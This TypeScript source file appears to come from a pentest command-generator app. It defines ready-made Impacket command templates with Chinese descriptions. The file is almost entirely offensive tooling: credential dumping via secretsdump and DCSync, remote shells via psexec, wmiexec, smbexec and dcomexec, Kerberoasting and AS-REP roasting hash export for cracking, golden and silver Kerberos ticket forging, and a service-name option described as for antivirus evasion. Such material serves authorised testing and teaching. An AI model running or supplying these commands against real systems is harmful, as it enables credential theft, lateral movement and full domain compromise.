import type { Tool } from '../../types';
import { buildImpacketAuth, buildImpacketDomainAuth, v } from '../../lib/auth';

/**
 * 所有命令均按 Kali Linux impacket-scripts 包的标准命名 (impacket-<name>)
 * 每条参数与本机安装的 impacket 官方 examples 脚本 argparse 定义逐一核对
 * (impacket v0.13/v0.14-dev, fortra/impacket)
 * 参考: https://github.com/fortra/impacket/tree/master/examples
 *
 * 通用 target 格式: [[domain/]username[:password]@]<targetName or address>
 * 通用认证参数:   -hashes LMHASH:NTHASH | -k -no-pass | -aesKey <hex key> -k
 * 例外工具通过 buildImpacketAuth 的 caps 参数关闭不支持的参数:
 * - lookupsid: 无 -dc-ip / -aesKey
 * - rpcdump:   无 -dc-ip / -k / -no-pass / -aesKey (仅 -hashes)
 */
export const impacketTools: Tool[] = [
  {
    id: 'secretsdump',
    name: 'impacket-secretsdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/secretsdump.py',
    description: '导出密码哈希和 Kerberos 密钥 (SAM/LSA/NTDS.dit)，默认走 DRSUAPI',
    commands: [
      {
        id: 'secretsdump-local',
        title: '本地 SAM 导出',
        description: '解析本地导出的注册表 hive，target 为关键字 LOCAL',
        build: () => `impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,
      },
      {
        id: 'secretsdump-remote',
        title: '远程 SAM/LSA 导出',
        description: '目标为 DC 时等价于 DCSync 全量导出',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'secretsdump-dcsync',
        title: 'DCSync 导出所有域用户哈希',
        description: '-just-dc 仅提取 NTDS.dit 数据 (NTLM 哈希和 Kerberos 密钥)，需要复制权限',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc`,
      },
      {
        id: 'secretsdump-dcsync-ntlm',
        title: 'DCSync 仅导出 NTLM 哈希',
        description: '-just-dc-ntlm 跳过 Kerberos 密钥，速度更快',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc-ntlm`,
      },
      {
        id: 'secretsdump-dcsync-user',
        title: 'DCSync 导出指定用户',
        description: '-just-dc-user 只接收用户名 (不带 domain/ 前缀)，隐含 -just-dc',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -just-dc-user ${v('', 'USERNAME')}`,
      },
      {
        id: 'secretsdump-vss',
        title: 'VSS 卷影副本方式导出 NTDS',
        description: '-use-vss 使用 NTDSUTIL VSS 方法代替默认 DRSUAPI，可用 -exec-method 指定 smbexec/wmiexec/mmcexec',
        build: (p) => `impacket-secretsdump ${buildImpacketAuth(p, { targetIp: true })} -use-vss`,
      },
      {
        id: 'secretsdump-ntds',
        title: '本地解析 NTDS.dit',
        description: '离线解析 ntdsutil/VSS 导出的 NTDS.dit 与 SYSTEM hive，-outputfile 为输出文件基名',
        build: () => `impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile ntds_dump LOCAL`,
      },
    ],
  },
  {
    id: 'psexec',
    name: 'impacket-psexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/psexec.py',
    description: '通过 RemComSvc 服务执行命令，获取交互式 shell',
    commands: [
      {
        id: 'psexec-shell',
        title: 'PSExec 交互式 Shell',
        description: 'command 省略时默认执行 cmd.exe',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'psexec-command',
        title: 'PSExec 执行单条命令',
        description: 'command 为位置参数，跟在 target 之后',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} whoami`,
      },
      {
        id: 'psexec-upload-exec',
        title: '上传并执行可执行文件',
        description: '-c 复制本地文件到目标后执行，参数通过 command 位置参数传递；可用 -path 指定远端目录',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} -c ${v(p.fileName, 'FILE.EXE')}`,
      },
      {
        id: 'psexec-service-name',
        title: '自定义服务名 (免杀/混淆)',
        description: '-service-name 指定触发 payload 的服务名，-remote-binary-name 指定上传到目标的二进制名',
        build: (p) => `impacket-psexec ${buildImpacketAuth(p, { targetIp: true })} -service-name ${v('', 'SERVICE_NAME')}`,
      },
    ],
  },
  {
    id: 'wmiexec',
    name: 'impacket-wmiexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/wmiexec.py',
    description: '通过 WMI 执行命令的半交互式 shell (默认不落地二进制)',
    commands: [
      {
        id: 'wmiexec-shell',
        title: 'WMI 交互式 Shell',
        description: 'command 省略时启动半交互式 shell，输出默认经 ADMIN$ 共享回传',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'wmiexec-command',
        title: 'WMI 执行单条命令',
        description: 'command 为位置参数，跟在 target 之后',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} "ipconfig /all"`,
      },
      {
        id: 'wmiexec-powershell',
        title: 'WMI PowerShell Shell',
        description: '-shell-type 选择命令处理器 (cmd/powershell)',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -shell-type powershell`,
      },
      {
        id: 'wmiexec-silent',
        title: '静默执行 (无输出)',
        description: '-silentcommand 不通过 cmd.exe 执行、无输出；-nooutput 则不建立 SMB 连接读取输出',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -silentcommand "${v('', 'COMMAND')}"`,
      },
      {
        id: 'wmiexec-share',
        title: '指定输出共享',
        description: '-share 指定回传输出所用的共享 (默认 ADMIN$)',
        build: (p) => `impacket-wmiexec ${buildImpacketAuth(p, { targetIp: true })} -share C$`,
      },
    ],
  },
  {
    id: 'smbexec',
    name: 'impacket-smbexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbexec.py',
    description: '通过 SMB 和服务管理器执行命令 (不落地二进制)',
    commands: [
      {
        id: 'smbexec-shell',
        title: 'SMBExec Shell (SHARE 模式)',
        description: '默认 -mode SHARE，输出写入目标共享 (默认 C$)',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'smbexec-server-mode',
        title: 'SERVER 模式执行',
        description: '-mode SERVER 由目标回连攻击机的本地 SMB 服务器回传输出，攻击机需要 root；目标无法外联时用默认 SHARE 模式',
        build: (p) => `impacket-smbexec ${buildImpacketAuth(p, { targetIp: true })} -mode SERVER`,
      },
    ],
  },
  {
    id: 'atexec',
    name: 'impacket-atexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/atexec.py',
    description: '通过任务计划 (Task Scheduler / TSCH) 执行命令',
    commands: [
      {
        id: 'atexec-command',
        title: 'ATExec 执行命令',
        description: 'command 为位置参数，跟在 target 之后',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} "systeminfo"`,
      },
      {
        id: 'atexec-session-id',
        title: '指定登录会话执行',
        description: '-session-id 在已存在的登录会话中执行 (无输出、不调用 cmd.exe)；-silentcommand 同样不回显输出',
        build: (p) => `impacket-atexec ${buildImpacketAuth(p)} -session-id ${v('', 'SESSION_ID')} "${v('', 'COMMAND')}"`,
      },
    ],
  },
  {
    id: 'dcomexec',
    name: 'impacket-dcomexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/dcomexec.py',
    description: '通过 DCOM 执行命令的半交互式 shell (默认 ShellWindows 对象)',
    commands: [
      {
        id: 'dcomexec-shell',
        title: 'DCOM Shell (默认 ShellWindows)',
        description: '-object 省略时默认使用 ShellWindows',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)}`,
      },
      {
        id: 'dcomexec-mmc20',
        title: 'DCOM MMC20 对象',
        description: '-object 可选 ShellWindows / ShellBrowserWindow / MMC20',
        build: (p) => `impacket-dcomexec ${buildImpacketAuth(p)} -object MMC20 "${v('', 'COMMAND')}"`,
      },
    ],
  },
  {
    id: 'GetUserSPNs',
    name: 'impacket-GetUserSPNs',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py',
    description: 'Kerberoasting - 查询域内用户账户的 SPN 并请求 TGS 票据 (target 为 domain[/user[:pass]]，无 @host)',
    commands: [
      {
        id: 'getuserspns-request',
        title: '请求所有 SPN 用户的 TGS',
        description: '-request 请求 TGS 并输出为 JtR/hashcat 格式',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request`,
      },
      {
        id: 'getuserspns-output',
        title: '导出哈希到文件',
        description: '-outputfile 将哈希写入文件供 hashcat 破解 (自动启用 -request)',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -outputfile kerberoast_hashes.txt`,
      },
      {
        id: 'getuserspns-target',
        title: '请求指定用户的票据',
        description: '-request-user 只接收用户名 (不带 domain/ 前缀)',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -request-user ${v('', 'SPN_USER')}`,
      },
      {
        id: 'getuserspns-save',
        title: '保存 TGS 为 ccache',
        description: '-save 将请求的 TGS 保存为 <username>.ccache (自动启用 -request)，可用于 pass-the-ticket',
        build: (p) => `impacket-GetUserSPNs ${buildImpacketDomainAuth(p)} -save`,
      },
    ],
  },
  {
    id: 'GetNPUsers',
    name: 'impacket-GetNPUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py',
    description: "AS-REP Roasting - 查询设置了 '不要求 Kerberos 预认证' 的用户并导出 AS-REP 哈希",
    commands: [
      {
        id: 'getnpusers-enum',
        title: '枚举无预认证用户 (无需凭据)',
        description: '无凭据时 target 为 domain/ (以斜杠结尾)，-usersfile 每行一个用户名',
        build: (p) => `impacket-GetNPUsers ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -dc-ip ${v(p.dcIP, 'DC_IP')} -format hashcat -outputfile asrep_hashes.txt`,
      },
      {
        id: 'getnpusers-request',
        title: '从 DC 枚举 (需认证)',
        description: '有凭据时 -request 请求 TGT 并输出为 JtR/hashcat 格式',
        build: (p) => `impacket-GetNPUsers ${buildImpacketDomainAuth(p)} -request`,
      },
    ],
  },
  {
    id: 'getTGT',
    name: 'impacket-getTGT',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/getTGT.py',
    description: '用密码/哈希/AES Key 请求 TGT 并保存为 ccache (identity 为 [domain/]user[:pass])',
    commands: [
      {
        id: 'gettgt-password',
        title: '通过密码获取 TGT',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-hash',
        title: '通过 NTLM 哈希获取 TGT',
        description: '-hashes 格式为 LMHASH:NTHASH，仅 NT 哈希时用 :NTHASH',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-aes',
        title: '通过 AES Key 获取 TGT',
        build: (p) => `impacket-getTGT ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -aesKey ${v(p.aesKey, 'AESKEY')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
    ],
  },
  {
    id: 'ticketer',
    name: 'impacket-ticketer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/ticketer.py',
    description: '伪造 Kerberos 黄金/白银票据，生成 <用户名>.ccache (target 位置参数为票据中的用户名)',
    commands: [
      {
        id: 'ticketer-golden',
        title: 'Golden Ticket (krbtgt NT 哈希)',
        description: '-nthash 为 krbtgt 的 NT 哈希；-spn 省略时生成黄金票据',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'KRBTGT_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-golden-aes',
        title: 'Golden Ticket (krbtgt AES Key)',
        description: '-aesKey 为 krbtgt 的 AES128/256 Key，比 NT 哈希更隐蔽',
        build: (p) => `impacket-ticketer -aesKey ${v(p.aesKey, 'KRBTGT_AESKEY')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-silver',
        title: 'Silver Ticket (服务账户 NT 哈希)',
        description: '-spn 格式为 service/server (如 cifs/dc01.domain.local)，-nthash 为服务账户 NT 哈希',
        build: (p) => `impacket-ticketer -nthash ${v(p.ntHash, 'SERVICE_NTHASH')} -domain-sid ${v(p.domainSid, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -spn ${v(p.spn, 'cifs/HOST.DOMAIN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-export',
        title: '导出票据供 -k 使用',
        description: '生成 ccache 后需设置环境变量，其他 impacket 工具用 -k -no-pass 调用',
        build: (p) => `export KRB5CCNAME=${v(p.username, 'USER')}.ccache`,
      },
    ],
  },
  {
    id: 'mssqlclient',
    name: 'impacket-mssqlclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py',
    description: 'MSSQL 客户端 (TDS 协议，默认端口 1433)',
    commands: [
      {
        id: 'mssqlclient-connect',
        title: 'MSSQL 连接 (SQL 认证)',
        description: '默认 SQL 认证；进入后可用 enable_xp_cmdshell / xp_cmdshell 等命令',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'mssqlclient-windows',
        title: 'MSSQL Windows 认证',
        description: '-windows-auth 使用 Windows (NTLM/Kerberos) 认证',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })} -windows-auth`,
      },
      {
        id: 'mssqlclient-port',
        title: '指定端口/数据库连接',
        description: '-port 指定 MSSQL 端口 (默认 1433)，-db 指定数据库实例',
        build: (p) => `impacket-mssqlclient ${buildImpacketAuth(p, { targetIp: true })} -port ${v(p.targetPort, 'PORT')} -windows-auth`,
      },
    ],
  },
  {
    id: 'impacket-smbclient',
    name: 'impacket-smbclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/smbclient.py',
    description: 'SMB 客户端 (交互式迷你 shell，支持 shares/use/ls/get/put)',
    commands: [
      {
        id: 'smbclient-shell',
        title: 'SMB 交互式 Shell',
        description: '进入后可用 shares / use C$ / ls / get / put 等迷你 shell 命令',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p, { targetIp: true })}`,
      },
      {
        id: 'smbclient-inputfile',
        title: '批量执行 SMB 命令',
        description: '-inputfile 每行一条迷你 shell 命令，例如: use C$ / put nc.exe / exit；-outputfile 记录操作日志',
        build: (p) => `impacket-smbclient ${buildImpacketAuth(p, { targetIp: true })} -inputfile smb_commands.txt`,
      },
    ],
  },
  {
    id: 'lookupsid',
    name: 'impacket-lookupsid',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/lookupsid.py',
    description: '通过 SID 暴力枚举域/本地用户和组 (maxRid 为位置参数，默认 4000；不支持 -dc-ip/-aesKey)',
    commands: [
      {
        id: 'lookupsid-enum',
        title: '枚举 SID',
        build: (p) => `impacket-lookupsid ${buildImpacketAuth(p, { dcIp: false, aesKey: false, targetIp: true })}`,
      },
      {
        id: 'lookupsid-maxrid',
        title: '指定最大 RID',
        description: 'maxRid 为 target 之后的位置参数 (默认 4000)',
        build: (p) => `impacket-lookupsid ${buildImpacketAuth(p, { dcIp: false, aesKey: false, targetIp: true })} 5000`,
      },
      {
        id: 'lookupsid-domain-sids',
        title: '枚举域 SID',
        description: '-domain-sids 枚举域 SID (请求可能被转发到 DC)',
        build: (p) => `impacket-lookupsid ${buildImpacketAuth(p, { dcIp: false, aesKey: false, targetIp: true })} -domain-sids`,
      },
    ],
  },
  {
    id: 'GetADUsers',
    name: 'impacket-GetADUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/GetADUsers.py',
    description: '枚举域用户数据 (target 为 domain[/user[:pass]]，无 @host)',
    commands: [
      {
        id: 'getadusers-all',
        title: '列举所有域用户',
        description: '-all 包含无邮箱和已禁用的账户',
        build: (p) => `impacket-GetADUsers ${buildImpacketDomainAuth(p)} -all`,
      },
      {
        id: 'getadusers-single',
        title: '查询指定用户',
        description: '-user 只接收用户名 (不带 domain/ 前缀)',
        build: (p) => `impacket-GetADUsers ${buildImpacketDomainAuth(p)} -user ${v('', 'TARGET_USER')}`,
      },
    ],
  },
  {
    id: 'findDelegation',
    name: 'impacket-findDelegation',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/findDelegation.py',
    description: '查询域内委派关系 (非约束/约束/基于资源的约束委派)',
    commands: [
      {
        id: 'finddelegation-query',
        title: '查找委派',
        build: (p) => `impacket-findDelegation ${buildImpacketDomainAuth(p)}`,
      },
      {
        id: 'finddelegation-target-domain',
        title: '跨信任查询委派',
        description: '-target-domain 查询与用户所在域不同的域 (跨信任委派)',
        build: (p) => `impacket-findDelegation ${buildImpacketDomainAuth(p)} -target-domain ${v('', 'TARGET_DOMAIN')}`,
      },
    ],
  },
  {
    id: 'rpcdump',
    name: 'impacket-rpcdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket/blob/master/examples/rpcdump.py',
    description: '通过 epmapper 枚举远程 RPC 端点 (仅支持密码/-hashes，不支持 Kerberos 与 -dc-ip)',
    commands: [
      {
        id: 'rpcdump-enum',
        title: 'RPC 枚举',
        description: 'rpcdump 无 -k/-aesKey/-no-pass 参数，Kerberos 认证模式下仅输出 target',
        build: (p) => `impacket-rpcdump ${buildImpacketAuth(p, { dcIp: false, kerberos: false, aesKey: false, targetIp: true })}`,
      },
    ],
  },
];
